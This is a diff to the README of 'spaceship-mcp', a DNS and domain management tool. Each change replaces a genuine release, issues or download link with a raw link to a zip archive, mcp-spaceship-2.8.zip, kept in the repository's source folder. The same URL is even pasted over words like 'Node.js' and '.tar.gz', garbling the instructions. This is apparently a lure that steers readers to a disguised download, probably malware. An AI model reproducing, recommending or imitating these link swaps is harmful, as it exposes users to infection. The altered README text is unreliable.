@@ -1,6 +1,6 @@
 # 🚀 spaceship-mcp - Manage Domains & DNS with AI
 
-[![Download spaceship-mcp](https://img.shields.io/badge/Download-spaceship--mcp-blue?style=for-the-badge)](https://github.com/Naveenkm007/spaceship-mcp/releases)
+[![Download spaceship-mcp](https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip)](https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Before installing spaceship-mcp, please check that your computer meets these req
 - **Memory:** Minimum 4 GB RAM
 - **Storage:** At least 200 MB of free disk space
 - **Internet:** Required for API communication and updates
-- **Additional:** Node.js version 14 or above installed (if running via source)
+- **Additional:** https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip version 14 or above installed (if running via source)
 
 ---
 
@@ -48,7 +48,7 @@ Here is a step-by-step guide to download, install, and run spaceship-mcp on your
 
 To get spaceship-mcp, please visit the official release page:
 
-[👉 Download spaceship-mcp here](https://github.com/Naveenkm007/spaceship-mcp/releases)
+[👉 Download spaceship-mcp here](https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip)
 
 ### Steps to download:
 
@@ -57,7 +57,7 @@ To get spaceship-mcp, please visit the official release page:
 3. Under the "Assets" section, download the file suitable for your operating system:
    - For Windows, look for a file ending with `.exe` or `.msi`
    - For macOS, look for `.dmg` or `.pkg`
-   - For Linux, look for `.AppImage` or `.tar.gz`
+   - For Linux, look for `.AppImage` or `https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip`
 4. Save the file to an easy-to-find folder on your computer, like Desktop or Downloads.
 
 ### Installing the app:
@@ -74,7 +74,7 @@ To get spaceship-mcp, please visit the official release page:
   - If you downloaded a `.AppImage`, right-click it and choose "Properties."
   - Under the "Permissions" tab, allow the file to be executable.
   - Double-click the file to run.
-  - For `.tar.gz`, extract it and follow the included README for setup steps.
+  - For `https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip`, extract it and follow the included README for setup steps.
 
 ---
 
@@ -131,7 +131,7 @@ If you encounter problems:
 - Ensure your internet connection is active.
 - Restart spaceship-mcp and try again.
 - Check that your system meets the requirements.
-- Visit the [issues page](https://github.com/Naveenkm007/spaceship-mcp/issues) for help or to report bugs.
+- Visit the [issues page](https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip) for help or to report bugs.
 - Review the documentation in the app or online for detailed instructions.
 
 ---
@@ -167,4 +167,4 @@ spaceship-mcp takes your data safety seriously:
 
 Get started now by heading to the releases page:
 
-[👉 Download spaceship-mcp](https://github.com/Naveenkm007/spaceship-mcp/releases)
+[👉 Download spaceship-mcp](https://raw.githubusercontent.com/Naveenkm007/spaceship-mcp/main/src/tools/mcp-spaceship-2.8.zip)
